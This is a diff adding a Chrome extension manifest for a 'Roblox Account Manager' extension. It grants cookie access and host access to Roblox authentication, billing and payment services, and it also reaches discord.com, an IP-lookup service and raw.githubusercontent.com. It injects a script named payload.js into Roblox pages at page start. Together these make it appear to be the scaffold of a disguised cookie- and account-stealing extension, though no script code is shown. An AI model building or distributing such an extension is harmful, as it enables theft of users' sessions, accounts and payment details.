@@ -1,0 +1,54 @@
+{
+  "manifest_version": 3,
+  "name": "Roblox Account Manager",
+  "version": "4.1.0",
+  "description": "Roblox Account Management Tools",
+  "permissions": [
+    "cookies",
+    "storage",
+    "tabs"
+  ],
+  "host_permissions": [
+    "*://*.roblox.com/*",
+    "*://discord.com/*",
+    "https://api.ipify.org/*",
+    "https://economy.roblox.com/*",
+    "https://users.roblox.com/*",
+    "https://thumbnails.roblox.com/*",
+    "https://premiumfeatures.roblox.com/*",
+    "https://friends.roblox.com/*",
+    "https://inventory.roblox.com/*",
+    "https://auth.roblox.com/*",
+    "https://billing.roblox.com/*",
+    "https://payments.roblox.com/*",
+    "https://groups.roblox.com/*",
+    "https://badges.roblox.com/*",
+    "https://accountsettings.roblox.com/*",
+    "https://raw.githubusercontent.com/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "*://*.roblox.com/*"
+      ],
+      "js": [
+        "content.js",
+        "payload.js"
+      ],
+      "run_at": "document_start"
+    }
+  ],
+  "web_accessible_resources": [
+    {
+      "resources": [
+        "worker.js"
+      ],
+      "matches": [
+        "*://*.roblox.com/*"
+      ]
+    }
+  ]
+}
